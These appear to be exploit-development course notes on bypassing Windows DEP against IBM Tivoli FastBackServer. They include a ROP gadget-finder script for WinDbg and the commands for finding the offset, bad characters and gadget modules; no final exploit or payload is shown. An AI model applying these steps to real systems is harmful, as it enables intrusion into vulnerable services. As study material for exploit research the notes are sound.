# 9. Stack  Overflows and DEP Bypass

## Check current memory protections



```bash
# WinDbg - Display the memory protections of a given address
!vprot eip
!vprot esp
# Check mitigations with narly won't work for Windows Defender Exploit Guard
.load narly
!nmod
```

## Windows Defender Exploit Guard

### Enable DEP for a program

1. From start menu open Windows Defender Security Center
2. Select App & Browser control and scroll to the bottom and click on Exploit protection settings
3. Click on Program Settings tab
4. Click Add program to customize and select Choose exact file path
5. Select the desired EXE file
6. In the program settings menu scroll down to Data Execution Prevention and click on Override system settings to On.&#x20;

### Verify DEP is enabled without Narly

```bash
0:066> ed esp 90909090

0:066> r eip = esp

0:066> p
(7a8.1310): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00240000 ebx=00000000 ecx=77939bc0 edx=77939bc0 esi=77939bc0 edi=77939bc0
eip=0b93ff54 esp=0b93ff54 ebp=0b93ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
0b93ff54 90              nop
```

## Gadget selection

### Debugger Automation: Pykd

Basic PoC code

```python
from pykd import *
dprintln("Hello World!")
```

```
.load pykd
!py C:\Tools\pykd\HelloWorld.py
```

<figure><img src="../../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

#### Locating executable pages

```python
"""
Pykd Gadget Discovery Tool
"""

from pykd import *
import sys, time

HEADER =  "#"*80 + "\r\n"
HEADER += "# findrop.py - pykd module for Gadget Discovery\r\n"
HEADER += "#"*80 + "\r\n\r\n"

##MEM_ACCESS = {
##0x1   : "PAGE_NOACCESS"                                                    ,
##0x2   : "PAGE_READONLY"                                                    ,
##0x4   : "PAGE_READWRITE"                                                   ,
##0x8   : "PAGE_WRITECOPY"                                                   ,
##0x10  : "PAGE_EXECUTE"                                                     ,
##0x20  : "PAGE_EXECUTE_READ"                                                ,
##0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
##0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
##0x101 : "PAGE_NOACCESS PAGE_GUARD"                                         ,
##0x102 : "PAGE_READONLY PAGE_GUARD "                                        ,
##0x104 : "PAGE_READWRITE PAGE_GUARD"                                        ,
##0x108 : "PAGE_WRITECOPY PAGE_GUARD"                                        ,
##0x110 : "PAGE_EXECUTE PAGE_GUARD"                                          ,
##0x120 : "PAGE_EXECUTE_READ PAGE_GUARD"                                     ,
##0x140 : "PAGE_EXECUTE_READWRITE PAGE_GUARD"                                ,
##0x180 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD"                                ,
##0x301 : "PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE"                            ,
##0x302 : "PAGE_READONLY PAGE_GUARD PAGE_NOCACHE"                            ,
##0x304 : "PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE"                           ,
##0x308 : "PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE"                           ,
##0x310 : "PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE"                             ,
##0x320 : "PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE"                        ,
##0x340 : "PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE"                   ,
##0x380 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE"                   ,
##0x701 : "PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"          ,
##0x702 : "PAGE_READONLY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"          ,
##0x704 : "PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"         ,
##0x708 : "PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"         ,
##0x710 : "PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"           ,
##0x720 : "PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE"      ,
##0x740 : "PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE" ,
##0x780 : "PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE" ,
##}

MEM_ACCESS_EXE = {
0x10  : "PAGE_EXECUTE"                                                     ,
0x20  : "PAGE_EXECUTE_READ"                                                ,
0x40  : "PAGE_EXECUTE_READWRITE"                                           ,
0x80  : "PAGE_EXECUTE_WRITECOPY"                                           ,
}

PAGE_SIZE = 0x1000
MAX_GADGET_SIZE = 8


BAD = ["clts", "hlt", "lmsw", "ltr", "lgdt", "lidt" ,"lldt", "mov cr", "mov dr",
    "mov tr", "in ", "ins", "invlpg", "invd", "out", "outs", "cli", "sti"
    "popf", "pushf", "int", "iret", "iretd", "swapgs", "wbinvd", "call",
    "jmp", "leave", "ja", "jb", "jc", "je", "jr", "jg", "jl", "jn", "jo",
    "jp", "js", "jz", "lock", "enter", "wait", "???"]

def log(msg):
 """
 Log a message to console.
 @param msg: Message string
 @return: None
 """
 print("[+] " + msg)

def getModule(modname):
 """
 Return a module object.
 @param modname: string module name
 @return: pykd module object
 """
 return module(modname)

def isPageExec(address):
 """
 Return True if a mem page is marked as executable
 @param address: address in hex format 0x41414141.
 @return: Bool
 """
 try:
     protect = getVaProtect(address)
 except:
     protect = 0x1
 if protect in MEM_ACCESS_EXE.keys():
     return True
 else:
     return False

def findExecPages(mod):
 """
 Find Executable Memory Pages for a module.
 @param mod: module object returned by getModule
 @return: a python list of executable memory pages
 """
 pages = []
 pn = int((mod.end() - mod.begin()) / PAGE_SIZE)
 log("Total Memory Pages: %d" % pn)
 for i in range(0, pn):
     page = mod.begin() + i*PAGE_SIZE
     if isPageExec(page):
         pages.append(page)
 log("Executable Memory Pages: %d" % len(pages))
 return pages

def findRetn(pages):
 """
 Find all return instructions for the given memory pages.
 @param pages: list of memory pages
 @return: list of memory addresses
 """
 retn = []
 for page in pages:
     ptr = page
     while ptr < (page + PAGE_SIZE):
         b = loadSignBytes(ptr, 1)[0] & 0xff
         if b not in [0xc3, 0xc2]:
             ptr += 1
             continue
         else:
             retn.append(ptr)
             ptr += 1
             
 log("Found %d ret instructions" % len(retn))
 return retn
 
def formatInstr(instr, mod):
 """
 Replace address with modbase+offset.
 @param instr: instruction string from disasm.instruction()
 @param mod: module object from getModule
 @return: formatted instruction string: modbase+offset instruction
 """
 address = int(instr[0:8], 0x10)
 offset = address - mod.begin()
 return "%s+0x%x\t%s" % (mod.name(), offset, instr[9:])

def disasmGadget(addr, mod, fp):
 """
 Find gadgets. Start from a ret instruction and crawl back from 1 to
 MAX_GADGET_SIZE bytes. At each iteration disassemble instructions and
 make sure the result gadget has no invalid instruction and is still
 ending with a ret.
 @param addr: address of a ret instruction
 @param mod: module object from getModule
 @param fp: file object to log found gadgets
 @return: number of gadgets found starting from a specific address
 """
 count = 0
 for i in range(1, MAX_GADGET_SIZE):
     gadget = []
     ptr = addr - i
     dasm = disasm(ptr)
     gadget_size = dasm.length()
     while gadget_size <= MAX_GADGET_SIZE:
         instr = dasm.instruction()
         if any(bad in instr for bad in BAD):
             break
         gadget.append(instr)
         if instr.find("ret") != -1:
             break
         dasm.disasm()
         gadget_size += dasm.length()
     matching = [i for i in gadget if "ret" in i]
     if matching:
         count += 1
         fp.write("-"*86 + "\r\n")
         for instr in gadget:
            try:
                fp.write(str(instr) + "\r\n")
            except UnicodeEncodeError:
                print(str(repr(instr)))
 return count
     
if __name__ == '__main__':
 print("#"*63)
 print("# findrop.py pykd Gadget Discovery module #")
 print("#"*63)
 
 count = 0
 try:
     modname = sys.argv[1].strip()
 except IndexError:
     log("Syntax: findrop.py modulename [MAX_GADGET_SIZE]")
     log("Example: findrop.py ntdll 8")
     sys.exit()

 try:
     MAX_GADGET_SIZE = int(sys.argv[2])
 except IndexError:
     pass
 except ValueError:
     log("Syntax: findrop.py modulename [MAX_GADGET_SIZE]")
     log("Example: findrop.py ntdll 8")
     log("MAX_GADGET_SIZE needs to be an integer")
     sys,exit()
     
 mod = getModule(modname)
 if mod:
     pages = findExecPages(mod)
     retn  = findRetn(pages)
     if retn:
         fp = open("C:/tools/pykd/findrop_output.txt", "w")
         fp.write(HEADER)
         start = time.time()
         log("Gadget discovery started...")
         for ret in retn:
             count += disasmGadget(ret, mod, fp)                        
         fp.close()
         end = time.time()
         log("Gadget discovery ended (%d secs)." % int(end-start))
         log("Found %d gadgets in %s." % (count, mod.name()))
     else:
         log("ret instructions not found!")
```

```bash
.load pykd
!py C:\Tools\pykd\findropfull FastBackServer
```

### Optimized Gadget Discovery: RP++

```bash
# Make a copy of the file to be searched
C:\Tools\dep> copy "C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe" .
 1 file(s) copied.
# The -r 5 parameter specifies a maximum gadget length of 5
C:\Tools\dep> rp-win-x86.exe -f FastBackServer.exe -r 5 > rop.txt
# When searching use the below format to ensure nothing comes before the ret command
": pop eax ; ret"
```

## Bypassing DEP

### Getting The Offset

```bash
# Create pattern to find the offset
msf-pattern_create -l 0x200
# Run the updated PoC
python step1.py 192.168.223.10
# Find the offset
msf-pattern_offset -q 41326a41
```

### Confirm The Offset

```bash
# Update the PoC and rerun it. 
python step2.py 192.168.223.10
```

### Find the Bad Characters

{% code overflow="wrap" %}
```bash
# Update the PoC and rerun it. 
python step3.py 192.168.223.10
# Find the StackLimit & StackBase use them to search for the string to find the address location
!teb
s -b <StackLimit> <StackBase> 41 41 41 41 42 42 42 42
# Dump 150 bytes at the address found
db 0d1ee247 L150
# Bad Chars found
0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20
```
{% endcode %}

### Locating Gadgets

{% code overflow="wrap" %}
```bash
# Check the base address of the executeable. 
lm m FastBackServer
Browse full module list
start    end        module name
00400000 00c0c000   FastBackServer   (deferred)
# Notice that the uppermost byte is 0x00 which is a bad character. This means this executable is not suitable and a DLL will have to be found to use. 
# Run the lm command to find a module with an address space that won't contain bad chars. 
lm 
start    end        module name
00190000 001c3000   snclientapi   (deferred)             
001d0000 001fd000   libcclog   (deferred)             
00400000 00c0c000   FastBackServer   (deferred)             
012e0000 01322000   NLS        (deferred)             
01340000 0136b000   gsk8iccs   (deferred)             
013a0000 013da000   icclib019   (deferred)             
03100000 031f0000   libeay32IBM019   (deferred)
# CSFTPAV6 will work
lm m CSFTPAV6
# Copy this module to the C:\Tools\dep folder. 
copy "C:\Program Files\Tivoli\TSM\FastBack\server\csftpav6.dll" .
# Generate a list of gadgets. 
rp-win-x86.exe -f csftpav6.dll -r 5 > rop.txt
```
{% endcode %}

### VirtualAlloc

**VirtualAlloc function prototype**

```
 LPVOID WINAPI VirtualAlloc(
   _In_opt_ LPVOID lpAddress,
   _In_     SIZE_T dwSize,
   _In_     DWORD  flAllocationType,
   _In_     DWORD  flProtect
 );
```

